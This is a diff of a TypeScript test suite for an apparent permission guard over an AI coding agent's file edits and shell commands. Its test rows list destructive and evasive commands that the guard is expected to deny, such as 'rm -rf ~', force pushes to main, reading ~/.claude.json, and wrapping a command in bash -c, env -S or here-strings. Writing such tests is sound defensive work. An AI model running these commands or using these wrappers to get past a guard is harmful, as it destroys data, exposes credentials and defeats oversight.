@@ -98,157 +98,163 @@ function judge(
 const bash = (command: string, claims?: Claims) => judge('Bash', { command }, claims);
 
 describe('file edits', () => {
-  it.each<{
-    name: string;
-    tool: string;
-    path: string;
-    decision: 'allow' | 'deny';
-    reason?: string;
-  }>([
-    { name: 'claimed area', tool: 'Edit', path: 'src/api/a.ts', decision: 'allow' },
-    {
-      name: 'multi-edit in a claimed area',
-      tool: 'MultiEdit',
-      path: 'src/api/a.ts',
-      decision: 'allow',
-    },
-    {
-      name: 'absolute path inside a claimed area',
-      tool: 'Write',
-      path: '<repo>/src/api/b.ts',
-      decision: 'allow',
-    },
-    {
-      name: 'new file under a not-yet-created directory of a claimed area',
-      tool: 'Write',
-      path: 'src/api/deep/new/c.ts',
-      decision: 'allow',
-    },
-    {
-      name: 'unclaimed area',
-      tool: 'Edit',
-      path: 'src/ui/a.ts',
-      decision: 'deny',
-      reason: 'request_claim',
-    },
-    {
-      name: 'file in no area',
-      tool: 'Write',
-      path: 'scratch.txt',
-      decision: 'deny',
-      reason: 'request_claim',
-    },
-    {
-      name: 'escapes with ..',
-      tool: 'Edit',
-      path: '../other/x.ts',
-      decision: 'deny',
-      reason: 'outside the repository',
-    },
-    {
-      name: 'escapes with .. after a claimed prefix',
-      tool: 'Edit',
-      path: 'src/api/../../../x.ts',
-      decision: 'deny',
-      reason: 'outside the repository',
-    },
-    {
-      name: 'absolute path elsewhere',
-      tool: 'Write',
-      path: '/etc/hosts',
-      decision: 'deny',
-      reason: 'outside the repository',
-    },
-    {
-      name: 'through a symlink that leaves the repo',
-      tool: 'Write',
-      path: 'link/x.ts',
-      decision: 'deny',
-      reason: 'outside the repository',
-    },
-    {
-      name: 'through a symlink to an existing file outside',
-      tool: 'Edit',
-      path: 'link',
-      decision: 'deny',
-      reason: 'outside the repository',
-    },
-    {
-      name: 'the repository root itself',
-      tool: 'Write',
-      path: '.',
-      decision: 'deny',
-      reason: 'outside the repository',
-    },
-    {
-      name: 'hazard file without the hazard claim',
-      tool: 'Edit',
-      path: 'package.json',
-      decision: 'deny',
-      reason: 'hazard',
-    },
-    {
-      name: 'nested hazard file without the hazard claim',
-      tool: 'Edit',
-      path: 'src/api/package.json',
-      decision: 'deny',
-      reason: 'hazard',
-    },
-    {
-      name: 'dangling symlink to a new file outside the repo',
-      tool: 'Write',
-      path: 'src/api/dangling.ts',
-      decision: 'deny',
-      reason: 'outside the repository',
-    },
-    {
-      name: 'dangling relative symlink that leaves the repo',
-      tool: 'Write',
-      path: 'src/api/dangling-rel.ts',
-      decision: 'deny',
-      reason: 'outside the repository',
-    },
-  ])('$name', ({ tool, path, decision, reason }) => {
-    const filePath = path.replace('<repo>', repo.path);
-    const verdict = judge(tool, {
-      file_path: filePath,
-      content: 'x',
-      old_string: 'a',
-      new_string: 'b',
-    });
-    expect(verdict.decision).toBe(decision);
-    if (reason && verdict.decision === 'deny') expect(verdict.reason).toContain(reason);
+  it('allows an edit in a claimed area and denies one outside the claims, the repo or a hazard', () => {
+    const rows: {
+      name: string;
+      tool: string;
+      path: string;
+      decision: 'allow' | 'deny';
+      reason?: string;
+    }[] = [
+      { name: 'claimed area', tool: 'Edit', path: 'src/api/a.ts', decision: 'allow' },
+      {
+        name: 'multi-edit in a claimed area',
+        tool: 'MultiEdit',
+        path: 'src/api/a.ts',
+        decision: 'allow',
+      },
+      {
+        name: 'absolute path inside a claimed area',
+        tool: 'Write',
+        path: '<repo>/src/api/b.ts',
+        decision: 'allow',
+      },
+      {
+        name: 'new file under a not-yet-created directory of a claimed area',
+        tool: 'Write',
+        path: 'src/api/deep/new/c.ts',
+        decision: 'allow',
+      },
+      {
+        name: 'unclaimed area',
+        tool: 'Edit',
+        path: 'src/ui/a.ts',
+        decision: 'deny',
+        reason: 'request_claim',
+      },
+      {
+        name: 'file in no area',
+        tool: 'Write',
+        path: 'scratch.txt',
+        decision: 'deny',
+        reason: 'request_claim',
+      },
+      {
+        name: 'escapes with ..',
+        tool: 'Edit',
+        path: '../other/x.ts',
+        decision: 'deny',
+        reason: 'outside the repository',
+      },
+      {
+        name: 'escapes with .. after a claimed prefix',
+        tool: 'Edit',
+        path: 'src/api/../../../x.ts',
+        decision: 'deny',
+        reason: 'outside the repository',
+      },
+      {
+        name: 'absolute path elsewhere',
+        tool: 'Write',
+        path: '/etc/hosts',
+        decision: 'deny',
+        reason: 'outside the repository',
+      },
+      {
+        name: 'through a symlink that leaves the repo',
+        tool: 'Write',
+        path: 'link/x.ts',
+        decision: 'deny',
+        reason: 'outside the repository',
+      },
+      {
+        name: 'through a symlink to an existing file outside',
+        tool: 'Edit',
+        path: 'link',
+        decision: 'deny',
+        reason: 'outside the repository',
+      },
+      {
+        name: 'the repository root itself',
+        tool: 'Write',
+        path: '.',
+        decision: 'deny',
+        reason: 'outside the repository',
+      },
+      {
+        name: 'hazard file without the hazard claim',
+        tool: 'Edit',
+        path: 'package.json',
+        decision: 'deny',
+        reason: 'hazard',
+      },
+      {
+        name: 'nested hazard file without the hazard claim',
+        tool: 'Edit',
+        path: 'src/api/package.json',
+        decision: 'deny',
+        reason: 'hazard',
+      },
+      {
+        name: 'dangling symlink to a new file outside the repo',
+        tool: 'Write',
+        path: 'src/api/dangling.ts',
+        decision: 'deny',
+        reason: 'outside the repository',
+      },
+      {
+        name: 'dangling relative symlink that leaves the repo',
+        tool: 'Write',
+        path: 'src/api/dangling-rel.ts',
+        decision: 'deny',
+        reason: 'outside the repository',
+      },
+    ];
+    for (const { name, tool, path, decision, reason } of rows) {
+      const filePath = path.replace('<repo>', repo.path);
+      const verdict = judge(tool, {
+        file_path: filePath,
+        content: 'x',
+        old_string: 'a',
+        new_string: 'b',
+      });
+      const label = `${name}: ${tool} ${path}`;
+      expect.soft(verdict.decision, label).toBe(decision);
+      if (reason && verdict.decision === 'deny')
+        expect.soft(verdict.reason, label).toContain(reason);
+    }
   });
 
-  it.each<{ name: string; input: unknown; decision: 'allow' | 'deny' }>([
-    {
-      name: 'a notebook outside the repo is denied',
-      input: { notebook_path: '/etc/x.ipynb' },
-      decision: 'deny',
-    },
-    {
-      name: 'a notebook in a claimed area is allowed',
-      input: { notebook_path: 'src/api/n.ipynb' },
-      decision: 'allow',
-    },
-    { name: 'an edit with no path is left to the CLI', input: {}, decision: 'allow' },
-    {
-      name: 'an edit with a non-string path is left to the CLI',
-      input: { file_path: 7 },
-      decision: 'allow',
-    },
-    { name: 'a non-object input is left to the CLI', input: 'oops', decision: 'allow' },
-  ])('NotebookEdit input: $name', ({ input, decision }) => {
-    expect(judge('NotebookEdit', input).decision).toBe(decision);
+  it('judges a NotebookEdit by its path, and leaves an input with no string path to the CLI', () => {
+    const rows: { name: string; input: unknown; decision: 'allow' | 'deny' }[] = [
+      {
+        name: 'a notebook outside the repo is denied',
+        input: { notebook_path: '/etc/x.ipynb' },
+        decision: 'deny',
+      },
+      {
+        name: 'a notebook in a claimed area is allowed',
+        input: { notebook_path: 'src/api/n.ipynb' },
+        decision: 'allow',
+      },
+      { name: 'an edit with no path is left to the CLI', input: {}, decision: 'allow' },
+      {
+        name: 'an edit with a non-string path is left to the CLI',
+        input: { file_path: 7 },
+        decision: 'allow',
+      },
+      { name: 'a non-object input is left to the CLI', input: 'oops', decision: 'allow' },
+    ];
+    for (const { name, input, decision } of rows) {
+      expect.soft(judge('NotebookEdit', input).decision, name).toBe(decision);
+    }
   });
 
-  it('allows a hazard file when the hazard is claimed', () => {
+  it('allows a hazard file only when the hazard itself is claimed', () => {
     expect(
       judge('Edit', { file_path: 'package.json' }, [{ kind: 'hazard', name: 'deps' }]).decision,
     ).toBe('allow');
-  });
-
-  it('denies a hazard file when only an area of the same name is claimed', () => {
+    // An area of the same name is not the hazard.
     expect(
       judge('Edit', { file_path: 'package.json' }, [{ kind: 'area', name: 'deps' }]).decision,
     ).toBe('deny');
@@ -257,193 +263,203 @@ describe('file edits', () => {
   // Workbench spec §7.1, §7.3: in a pass a page's file is the page's, even when a shared area or a
   // hazard the lane holds also matches it. An area with no role that a task of the pass holds is a page.
   const PAGES = { pages: ['profile', 'settings'], baseBranch: 'main' };
-  it.each<{
-    name: string;
-    inPass?: { pages: readonly string[]; baseBranch: string };
-    claims: Claims;
-    path: string;
-    decision: 'allow' | 'deny';
-    reason?: string;
-  }>([
-    {
-      name: 'in a pass, a page file under a held shared area is denied, naming the page',
-      inPass: PAGES,
-      claims: [{ kind: 'area', name: 'src' }],
-      path: 'src/settings/page.tsx',
-      decision: 'deny',
-      reason: 'page "settings"',
-    },
-    {
-      name: 'in a pass, a page file under a held hazard is denied before the hazard allows it',
-      inPass: PAGES,
-      claims: [
-        { kind: 'area', name: 'src' },
-        { kind: 'hazard', name: 'deps' },
-      ],
-      path: 'src/settings/package.json',
-      decision: 'deny',
-      reason: 'page "settings"',
-    },
-    {
-      name: 'in a pass, a page file is allowed to the lane holding that page',
-      inPass: PAGES,
-      claims: [{ kind: 'area', name: 'settings' }],
-      path: 'src/settings/page.tsx',
-      decision: 'allow',
-    },
-    {
-      name: 'in a pass, a hazard under a held page still needs the hazard',
-      inPass: PAGES,
-      claims: [{ kind: 'area', name: 'settings' }],
-      path: 'src/settings/package.json',
-      decision: 'deny',
-      reason: 'hazard',
-    },
-    {
-      name: 'in a pass, a shared file is allowed under the held shared area',
-      inPass: PAGES,
-      claims: [{ kind: 'area', name: 'src' }],
-      path: 'src/lib/button.tsx',
-      decision: 'allow',
-    },
-    {
-      name: "in a pass, another task's area with no role under a held shared area is denied, naming it",
-      inPass: PAGES,
-      claims: [{ kind: 'area', name: 'src' }],
-      path: 'src/profile/card.tsx',
-      decision: 'deny',
-      reason: 'page "profile"',
-    },
-    {
-      name: "in a pass, the lane's own area with no role is allowed",
-      inPass: PAGES,
-      claims: [
-        { kind: 'area', name: 'settings' },
-        { kind: 'area', name: 'profile' },
-      ],
-      path: 'src/profile/card.tsx',
-      decision: 'allow',
-    },
-    {
-      name: 'in a pass, an area with no role no task of the pass holds is allowed under a held shared area',
-      inPass: { pages: ['settings'], baseBranch: 'main' },
-      claims: [{ kind: 'area', name: 'src' }],
-      path: 'src/profile/card.tsx',
-      decision: 'allow',
-    },
-    {
-      name: 'outside a pass, a page file under a held shared area is allowed as before',
-      claims: [{ kind: 'area', name: 'src' }],
-      path: 'src/settings/page.tsx',
-      decision: 'allow',
-    },
-  ])('$name', ({ inPass, claims, path, decision, reason }) => {
-    const verdict = judgeToolUse({
-      judge: JudgeKind.Rules,
-      coveredByAllowRule: false,
-      toolName: 'Edit',
-      toolInput: { file_path: path, old_string: 'a', new_string: 'b' },
-      repoPath: repo.path,
-      areas: [
-        { name: 'settings', globs: ['src/settings/**'], role: 'page', route: '/settings' },
-        { name: 'profile', globs: ['src/profile/**'] },
-        { name: 'src', globs: ['src/**'], role: 'shared' },
-      ],
-      hazards: DEFAULT_HAZARDS,
-      claims,
-      readOnly: false,
-      ...(inPass === undefined ? {} : { inPass }),
-      protectedPaths: guarded(),
-    });
-    expect(verdict.decision).toBe(decision);
-    if (reason && verdict.decision === 'deny') expect(verdict.reason).toContain(reason);
+  it("in a pass, gives a page's file to the lane holding the page, before a shared area or hazard", () => {
+    const rows: {
+      name: string;
+      inPass?: { pages: readonly string[]; baseBranch: string };
+      claims: Claims;
+      path: string;
+      decision: 'allow' | 'deny';
+      reason?: string;
+    }[] = [
+      {
+        name: 'in a pass, a page file under a held shared area is denied, naming the page',
+        inPass: PAGES,
+        claims: [{ kind: 'area', name: 'src' }],
+        path: 'src/settings/page.tsx',
+        decision: 'deny',
+        reason: 'page "settings"',
+      },
+      {
+        name: 'in a pass, a page file under a held hazard is denied before the hazard allows it',
+        inPass: PAGES,
+        claims: [
+          { kind: 'area', name: 'src' },
+          { kind: 'hazard', name: 'deps' },
+        ],
+        path: 'src/settings/package.json',
+        decision: 'deny',
+        reason: 'page "settings"',
+      },
+      {
+        name: 'in a pass, a page file is allowed to the lane holding that page',
+        inPass: PAGES,
+        claims: [{ kind: 'area', name: 'settings' }],
+        path: 'src/settings/page.tsx',
+        decision: 'allow',
+      },
+      {
+        name: 'in a pass, a hazard under a held page still needs the hazard',
+        inPass: PAGES,
+        claims: [{ kind: 'area', name: 'settings' }],
+        path: 'src/settings/package.json',
+        decision: 'deny',
+        reason: 'hazard',
+      },
+      {
+        name: 'in a pass, a shared file is allowed under the held shared area',
+        inPass: PAGES,
+        claims: [{ kind: 'area', name: 'src' }],
+        path: 'src/lib/button.tsx',
+        decision: 'allow',
+      },
+      {
+        name: "in a pass, another task's area with no role under a held shared area is denied, naming it",
+        inPass: PAGES,
+        claims: [{ kind: 'area', name: 'src' }],
+        path: 'src/profile/card.tsx',
+        decision: 'deny',
+        reason: 'page "profile"',
+      },
+      {
+        name: "in a pass, the lane's own area with no role is allowed",
+        inPass: PAGES,
+        claims: [
+          { kind: 'area', name: 'settings' },
+          { kind: 'area', name: 'profile' },
+        ],
+        path: 'src/profile/card.tsx',
+        decision: 'allow',
+      },
+      {
+        name: 'in a pass, an area with no role no task of the pass holds is allowed under a held shared area',
+        inPass: { pages: ['settings'], baseBranch: 'main' },
+        claims: [{ kind: 'area', name: 'src' }],
+        path: 'src/profile/card.tsx',
+        decision: 'allow',
+      },
+      {
+        name: 'outside a pass, a page file under a held shared area is allowed as before',
+        claims: [{ kind: 'area', name: 'src' }],
+        path: 'src/settings/page.tsx',
+        decision: 'allow',
+      },
+    ];
+    for (const { name, inPass, claims, path, decision, reason } of rows) {
+      const verdict = judgeToolUse({
+        judge: JudgeKind.Rules,
+        coveredByAllowRule: false,
+        toolName: 'Edit',
+        toolInput: { file_path: path, old_string: 'a', new_string: 'b' },
+        repoPath: repo.path,
+        areas: [
+          { name: 'settings', globs: ['src/settings/**'], role: 'page', route: '/settings' },
+          { name: 'profile', globs: ['src/profile/**'] },
+          { name: 'src', globs: ['src/**'], role: 'shared' },
+        ],
+        hazards: DEFAULT_HAZARDS,
+        claims,
+        readOnly: false,
+        ...(inPass === undefined ? {} : { inPass }),
+        protectedPaths: guarded(),
+      });
+      expect.soft(verdict.decision, name).toBe(decision);
+      if (reason && verdict.decision === 'deny')
+        expect.soft(verdict.reason, name).toContain(reason);
+    }
   });
 
   // A pass of one: the whole-project page is every file, and a hazard keeps its claim.
-  it.each<{
-    name: string;
-    claims: Claims;
-    path: string;
-    decision: 'allow' | 'deny';
-    reason?: string;
-  }>([
-    {
-      name: 'a source file is allowed to the lane holding the whole page',
-      claims: [{ kind: 'area', name: WHOLE_PROJECT_PAGE.name }],
-      path: 'src/a.ts',
-      decision: 'allow',
-    },
-    {
-      name: 'a lockfile is refused naming deps while the hazard is not held',
-      claims: [{ kind: 'area', name: WHOLE_PROJECT_PAGE.name }],
-      path: 'package.json',
-      decision: 'deny',
-      reason: 'deps',
-    },
-    {
-      name: 'a lockfile is allowed once the hazard is held',
-      claims: [
-        { kind: 'area', name: WHOLE_PROJECT_PAGE.name },
-        { kind: 'hazard', name: 'deps' },
-      ],
-      path: 'package.json',
-      decision: 'allow',
-    },
-    {
-      name: 'a migration is refused naming migrations while the hazard is not held',
-      claims: [{ kind: 'area', name: WHOLE_PROJECT_PAGE.name }],
-      path: 'db/migrations/0001.sql',
-      decision: 'deny',
-      reason: 'migrations',
-    },
-    {
-      name: '.git/config is refused even with the whole page held',
-      claims: [{ kind: 'area', name: WHOLE_PROJECT_PAGE.name }],
-      path: '.git/config',
-      decision: 'deny',
-    },
-    {
-      name: 'a nested .git entry (a gitfile) is refused with the whole page held',
-      claims: [{ kind: 'area', name: WHOLE_PROJECT_PAGE.name }],
-      path: 'packages/sub/.git',
-      decision: 'deny',
-    },
-    {
-      name: 'a file is refused when the whole page is not held',
-      claims: [],
-      path: 'src/a.ts',
-      decision: 'deny',
-      reason: 'Whole project',
-    },
-  ])('a pass of one: $name', ({ claims, path, decision, reason }) => {
-    const verdict = judgeToolUse({
-      judge: JudgeKind.Rules,
-      coveredByAllowRule: false,
-      toolName: 'Edit',
-      toolInput: { file_path: path, old_string: 'a', new_string: 'b' },
-      repoPath: repo.path,
-      areas: [WHOLE_PROJECT_PAGE],
-      hazards: DEFAULT_HAZARDS,
-      claims,
-      readOnly: false,
-      inPass: { pages: [WHOLE_PROJECT_PAGE.name], baseBranch: 'main' },
-      protectedPaths: guarded(),
-    });
-    expect(verdict.decision).toBe(decision);
-    if (reason && verdict.decision === 'deny') expect(verdict.reason).toContain(reason);
+  it('a pass of one: the whole page is every file but .git, and a hazard keeps its claim', () => {
+    const rows: {
+      name: string;
+      claims: Claims;
+      path: string;
+      decision: 'allow' | 'deny';
+      reason?: string;
+    }[] = [
+      {
+        name: 'a source file is allowed to the lane holding the whole page',
+        claims: [{ kind: 'area', name: WHOLE_PROJECT_PAGE.name }],
+        path: 'src/a.ts',
+        decision: 'allow',
+      },
+      {
+        name: 'a lockfile is refused naming deps while the hazard is not held',
+        claims: [{ kind: 'area', name: WHOLE_PROJECT_PAGE.name }],
+        path: 'package.json',
+        decision: 'deny',
+        reason: 'deps',
+      },
+      {
+        name: 'a lockfile is allowed once the hazard is held',
+        claims: [
+          { kind: 'area', name: WHOLE_PROJECT_PAGE.name },
+          { kind: 'hazard', name: 'deps' },
+        ],
+        path: 'package.json',
+        decision: 'allow',
+      },
+      {
+        name: 'a migration is refused naming migrations while the hazard is not held',
+        claims: [{ kind: 'area', name: WHOLE_PROJECT_PAGE.name }],
+        path: 'db/migrations/0001.sql',
+        decision: 'deny',
+        reason: 'migrations',
+      },
+      {
+        name: '.git/config is refused even with the whole page held',
+        claims: [{ kind: 'area', name: WHOLE_PROJECT_PAGE.name }],
+        path: '.git/config',
+        decision: 'deny',
+      },
+      {
+        name: 'a nested .git entry (a gitfile) is refused with the whole page held',
+        claims: [{ kind: 'area', name: WHOLE_PROJECT_PAGE.name }],
+        path: 'packages/sub/.git',
+        decision: 'deny',
+      },
+      {
+        name: 'a file is refused when the whole page is not held',
+        claims: [],
+        path: 'src/a.ts',
+        decision: 'deny',
+        reason: 'Whole project',
+      },
+    ];
+    for (const { name, claims, path, decision, reason } of rows) {
+      const verdict = judgeToolUse({
+        judge: JudgeKind.Rules,
+        coveredByAllowRule: false,
+        toolName: 'Edit',
+        toolInput: { file_path: path, old_string: 'a', new_string: 'b' },
+        repoPath: repo.path,
+        areas: [WHOLE_PROJECT_PAGE],
+        hazards: DEFAULT_HAZARDS,
+        claims,
+        readOnly: false,
+        inPass: { pages: [WHOLE_PROJECT_PAGE.name], baseBranch: 'main' },
+        protectedPaths: guarded(),
+      });
+      expect.soft(verdict.decision, name).toBe(decision);
+      if (reason && verdict.decision === 'deny')
+        expect.soft(verdict.reason, name).toContain(reason);
+    }
   });
 
-  it.each<{ name: string; path: string; skip?: boolean }>([
-    { name: 'a path below a regular file (ENOTDIR)', path: 'src/api/a.ts/x' },
-    {
-      name: 'a path in an unreadable directory (EACCES)',
-      path: '/private/var/root/x',
-      skip: process.platform !== 'darwin' || process.getuid?.() === 0,
-    },
-  ])('denies instead of throwing for $name', ({ path, skip }) => {
-    if (skip) return;
-    const verdict = judge('Write', { file_path: path }, API_AND_DB);
-    expect(verdict.decision).toBe('deny');
+  it('denies instead of throwing for a path it cannot stat', () => {
+    const rows: { name: string; path: string; skip?: boolean }[] = [
+      { name: 'a path below a regular file (ENOTDIR)', path: 'src/api/a.ts/x' },
+      {
+        name: 'a path in an unreadable directory (EACCES)',
+        path: '/private/var/root/x',
+        skip: process.platform !== 'darwin' || process.getuid?.() === 0,
+      },
+    ];
+    for (const { name, path, skip } of rows) {
+      if (skip) continue;
+      expect.soft(judge('Write', { file_path: path }, API_AND_DB).decision, name).toBe('deny');
+    }
   });
 
   it.skipIf(process.platform !== 'darwin')('case-insensitive file systems', () => {
@@ -477,312 +493,348 @@ describe('file edits', () => {
 });
 
 describe('shell commands', () => {
-  it.each<{ name: string; command: string; decision: 'allow' | 'deny' }>([
-    { name: 'read-only git status', command: 'git status --short', decision: 'allow' },
-    { name: 'read-only git diff', command: 'git diff HEAD~1 -- src', decision: 'allow' },
-    { name: 'read-only git log', command: 'git log --oneline -5', decision: 'allow' },
-    { name: 'listing branches', command: 'git branch', decision: 'allow' },
-    { name: 'push a feature branch', command: 'git push origin feat/x', decision: 'deny' },
-    { name: 'test runner', command: 'pnpm vitest run', decision: 'allow' },
-    { name: 'rm -rf inside the repo', command: 'rm -rf build', decision: 'allow' },
-    { name: 'direct commit', command: "git commit -m 'x'", decision: 'deny' },
-    { name: 'git add dot', command: 'git add .', decision: 'deny' },
-    { name: 'git add a path', command: 'git add src/api/a.ts', decision: 'deny' },
-    { name: 'checkout', command: 'git checkout main', decision: 'deny' },
-    { name: 'switch', command: 'git switch -c x', decision: 'deny' },
-    { name: 'stash', command: 'git stash', decision: 'deny' },
-    { name: 'hard reset', command: 'git reset --hard', decision: 'deny' },
-    { name: 'branch delete', command: 'git branch -D old', decision: 'deny' },
-    { name: 'pull', command: 'git pull', decision: 'deny' },
-    { name: 'force push', command: 'git push --force origin feat/x', decision: 'deny' },
-    { name: 'push to main', command: 'git push origin main', decision: 'deny' },
-    { name: 'push HEAD to master', command: 'git push origin HEAD:master', decision: 'deny' },
-    {
-      name: 'commit in another directory',
-      command: 'git -C ../other commit -m x',
-      decision: 'deny',
-    },
-    { name: 'commit after cd', command: "cd src && git commit -m 'x'", decision: 'deny' },
-    { name: 'reset inside bash -c', command: 'bash -c "git reset --hard"', decision: 'deny' },
-    {
-      name: 'reset inside bash -c after an option',
-      command: "bash -c -e 'git push --force origin main'",
-      decision: 'deny',
-    },
-    {
-      name: 'reset inside bash -c after --',
-      command: "sh -c -- 'git push --force origin main'",
-      decision: 'deny',
-    },
-    {
-      name: 'reset inside bash -c after -o and its value',
-      command: "bash -c -o pipefail 'git push --force origin main'",
-      decision: 'deny',
-    },
-    {
-      name: 'push in bash -c after a lone dash',
-      command: "bash -c - 'git push --force origin main'",
-      decision: 'deny',
-    },
-    {
-      name: 'push in a here-string on fd 0',
-      command: "bash /dev/stdin 0<<<'git push --force origin main'",
-      decision: 'deny',
-    },
-    { name: 'checkout in a $() substitution', command: 'echo $(git checkout .)', decision: 'deny' },
-    { name: 'stash in a backtick substitution', command: 'echo `git stash`', decision: 'deny' },
-    {
-      name: 'checkout behind env and an assignment',
-      command: 'FOO=1 env git checkout .',
-      decision: 'deny',
-    },
-    { name: 'rm -rf in /tmp', command: 'rm -rf /tmp/x', decision: 'deny' },
-    { name: 'rm -rf in home', command: 'rm -rf ~/projects', decision: 'deny' },
-    { name: 'rm -rf the repo', command: 'rm -rf .', decision: 'deny' },
-    { name: 'rm -rf a sibling', command: 'rm -rf ../sibling', decision: 'deny' },
-    { name: 'vercel prod deploy', command: 'vercel deploy --prod', decision: 'deny' },
-    { name: 'pnpm publish', command: 'pnpm publish', decision: 'deny' },
-    { name: 'terraform apply', command: 'terraform apply', decision: 'deny' },
-    { name: 'sudo', command: 'sudo ls', decision: 'deny' },
-    { name: 'env split string', command: "env -S 'git status'", decision: 'deny' },
-    { name: 'env split string in a cluster', command: "env -iS 'rm -rf ~'", decision: 'deny' },
-    {
-      name: 'env long split string',
-      command: "env --split-string='git status'",
-      decision: 'deny',
-    },
-    {
-      name: 'env abbreviated split string',
-      command: "env --split='cat ~/.claude.json'",
-      decision: 'deny',
-    },
-    { name: 'env split string behind nice', command: "nice env -S 'git status'", decision: 'deny' },
-    {
-      name: 'env split string before a command',
-      command: "env -S 'rm -rf ~' true",
-      decision: 'deny',
-    },
-    {
-      name: 'env split string in a cluster before a command',
-      command: "env -iS 'git checkout .' true",
-      decision: 'deny',
-    },
-    {
-      name: 'env long split string before a command',
-      command: "env --split-string='git checkout .' true",
-      decision: 'deny',
-    },
-    {
-      name: 'env abbreviated split string before a command',
-      command: "env --split='git checkout .' true",
-      decision: 'deny',
-    },
-    { name: 'env unsetting a variable named S', command: 'env -uS git status', decision: 'allow' },
-    {
-      name: 'env with an abbreviated long option',
-      command: "env --uns X bash -c 'rm -rf ~'",
-      decision: 'deny',
-    },
-    { name: 'env with an unknown long option', command: 'env --frob git status', decision: 'deny' },
-    { name: 'env -u', command: 'env -u FOO git status', decision: 'allow' },
-    { name: 'env --unset in full', command: 'env --unset FOO git status', decision: 'allow' },
-    { name: 'env --unset= in full', command: 'env --unset=FOO git status', decision: 'allow' },
-    { name: 'env ending its options', command: 'env -- git status', decision: 'allow' },
-    { name: 'pnpm add', command: 'pnpm add zod', decision: 'deny' },
-    { name: 'pnpm add with -w', command: 'pnpm -w add zod', decision: 'deny' },
-    {
-      name: 'pnpm add with --filter value',
-      command: 'pnpm --filter @10db/db add zod',
-      decision: 'deny',
-    },
-    {
-      name: 'pnpm remove with --filter=value',
-      command: 'pnpm --filter=@10db/db remove zod',
-      decision: 'deny',
-    },
-    { name: 'pnpm i', command: 'pnpm i', decision: 'deny' },
-    {
-      name: 'pnpm install with a flag',
-      command: 'pnpm install --frozen-lockfile',
-      decision: 'deny',
-    },
-    { name: 'npm i', command: 'npm i left-pad', decision: 'deny' },
-    {
-      name: 'drizzle-kit through pnpm exec',
-      command: 'pnpm exec drizzle-kit generate',
-      decision: 'deny',
-    },
-    {
-      name: 'db:migrate with a filter',
-      command: 'pnpm --filter @10db/db db:migrate',
-      decision: 'deny',
-    },
-    { name: 'filtered test run', command: 'pnpm --filter @10db/db test', decision: 'allow' },
-    { name: 'single & as a separator', command: 'true & git commit -m x', decision: 'deny' },
-    { name: 'subshell', command: '(git commit -m x)', decision: 'deny' },
-    { name: 'brace group', command: '{ git commit -m x; }', decision: 'deny' },
-    { name: 'absolute path to git', command: '/usr/bin/git commit -m x', decision: 'deny' },
-    { name: 'backslash-escaped git', command: '\\git commit -m x', decision: 'deny' },
-    { name: 'absolute path to rm', command: '/bin/rm -rf /tmp/x', decision: 'deny' },
-    { name: 'bash with combined -lc', command: 'bash -lc "git reset --hard"', decision: 'deny' },
-    { name: 'env with a flag', command: 'env -i git commit -m x', decision: 'deny' },
-    { name: 'env with a valued flag', command: 'env -u FOO git commit -m x', decision: 'deny' },
-    { name: 'time with a flag', command: 'time -p git commit -m x', decision: 'deny' },
-    { name: 'xargs wrapper', command: 'xargs git commit -m x', decision: 'deny' },
-    { name: 'xargs with a valued flag', command: 'xargs -n 1 git commit -m x', decision: 'deny' },
-    { name: 'pipe into sh', command: 'echo "git reset --hard" | sh', decision: 'deny' },
-    { name: 'pipe into bash with flags', command: 'cat x | bash -e', decision: 'deny' },
-    { name: 'stderr redirect is not a separator', command: 'git status 2>&1', decision: 'allow' },
-    {
-      name: 'parameter expansion braces are not a group',
-      command: 'echo ${HOME}',
-      decision: 'allow',
-    },
-    { name: 'git with --git-dir', command: 'git --git-dir .git commit -m x', decision: 'deny' },
-    { name: 'git with --git-dir=', command: 'git --git-dir=.git status', decision: 'deny' },
-    { name: 'git with --work-tree', command: 'git --work-tree . commit -m x', decision: 'deny' },
-    { name: 'git with --namespace', command: 'git --namespace x status', decision: 'deny' },
-    { name: 'git with -c config', command: 'git -c alias.s=!sh status', decision: 'deny' },
-    { name: 'git alias verb', command: 'git c -m x', decision: 'deny' },
-    {
-      name: 'git symbolic-ref',
-      command: 'git symbolic-ref HEAD refs/heads/other',
-      decision: 'deny',
-    },
-    { name: 'git config', command: 'git config alias.c commit', decision: 'deny' },
-    { name: 'git fetch', command: 'git fetch origin', decision: 'deny' },
-    { name: 'git tag create', command: 'git tag v1', decision: 'deny' },
-    { name: 'git -C with a read-only verb', command: 'git -C ../other status', decision: 'allow' },
-    { name: 'git show', command: 'git show HEAD', decision: 'allow' },
-    { name: 'git branch --list', command: 'git branch --list', decision: 'allow' },
-    { name: 'push -d', command: 'git push -d origin feat', decision: 'deny' },
-    { name: 'push colon refspec delete', command: 'git push origin :feat', decision: 'deny' },
-    { name: 'push -fu', command: 'git push -fu origin feat', decision: 'deny' },
-    { name: 'push --mirror', command: 'git push --mirror', decision: 'deny' },
-    { name: 'push --all', command: 'git push --all origin', decision: 'deny' },
-    { name: 'push --delete', command: 'git push --delete origin feat', decision: 'deny' },
-    { name: 'push +refspec', command: 'git push origin +feat', decision: 'deny' },
-    { name: 'push -u', command: 'git push -u origin feat', decision: 'deny' },
-    { name: 'pnpm -r publish', command: 'pnpm -r publish', decision: 'deny' },
-    { name: 'pnpm --filter publish', command: 'pnpm --filter x publish', decision: 'deny' },
-    { name: 'npx vercel deploy --prod', command: 'npx vercel deploy --prod', decision: 'deny' },
-    { name: 'pnpm dlx vercel --prod', command: 'pnpm dlx vercel --prod', decision: 'deny' },
-    { name: 'rm -rf with $HOME', command: 'rm -rf $HOME/projects', decision: 'deny' },
-    { name: 'rm -rf with quoted $HOME', command: 'rm -rf "$HOME"', decision: 'deny' },
-    { name: 'rm -rf .git', command: 'rm -rf .git', decision: 'deny' },
-    { name: 'rm -rf nested .git', command: 'rm -rf sub/.git/hooks', decision: 'deny' },
-    { name: 'rm -r after cd', command: 'cd .. && rm -rf sibling', decision: 'deny' },
-    { name: 'rm -r --recursive form', command: 'rm --recursive ../x', decision: 'deny' },
-    {
-      name: 'rm --force of a file is not recursive',
-      command: 'rm --force build/a.txt',
-      decision: 'allow',
-    },
-    {
-      name: 'rm -r of a dotfile that merely starts with .git',
-      command: 'rm -rf .github/tmp',
-      decision: 'allow',
-    },
-    { name: 'push to heads/main', command: 'git push origin heads/main', decision: 'deny' },
-    { name: 'push feat:heads/main', command: 'git push origin feat:heads/main', decision: 'deny' },
-    {
-      name: 'push feat:refs/heads/main',
-      command: 'git push origin feat:refs/heads/main',
-      decision: 'deny',
-    },
-    {
-      name: 'push refs/heads/master',
-      command: 'git push origin refs/heads/master',
-      decision: 'deny',
-    },
